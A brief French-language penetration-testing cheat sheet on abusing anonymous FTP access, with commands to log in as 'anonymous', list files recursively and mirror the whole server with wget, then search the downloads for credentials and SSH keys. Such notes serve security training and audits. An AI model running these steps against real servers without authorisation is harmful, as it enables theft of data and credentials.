# Exploitation FTP - Accès Anonyme
Si le service FTP (port 21) autorise les connexions anonymes, il est possible d'énumérer les fichiers sensibles.

## [1] Énumération
```bash
ftp <target_ip>
# Login: anonymous
# Pass: <any>
ls -R
```

## [2] Exploitation
Tentez de télécharger des fichiers de configuration ou des sauvegardes (.sql, .ini, .log).
```bash
wget -r ftp://anonymous@<target_ip>/
```

## [3] Post-Exploitation
Analysez les fichiers pour trouver des identifiants ou des clés SSH.
